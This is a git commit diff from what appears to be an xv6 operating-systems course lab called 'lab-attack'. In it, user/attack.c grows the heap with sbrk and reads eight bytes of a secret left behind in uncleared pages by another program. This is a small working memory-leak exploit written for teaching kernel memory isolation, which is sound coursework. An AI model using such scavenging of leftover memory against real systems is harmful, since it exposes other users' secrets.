53b824fd4a776b43eae32685a2271dd347bfc19c
apple-37 <1833346463@qq.com>
2025-07-09 17:06:24 +0800

    finish lab-attack

--- user/attack.c
+++ user/attack.c
@@ -3,11 +3,13 @@
 #include "user/user.h"
 #include "kernel/riscv.h"
 
+// 定义页面大小和要申请的页面数量，与 secret.c 保持一致
+#define PGSIZE 4096
 int
 main(int argc, char *argv[])
 {
-  // your code here.  you should write the secret to fd 2 using write
-  // (e.g., write(2, secret, 8)
-
+  char *end =sbrk(17*PGSIZE);
+  end+=16*PGSIZE;
+  write(2,end+32,8);
   exit(1);
 }
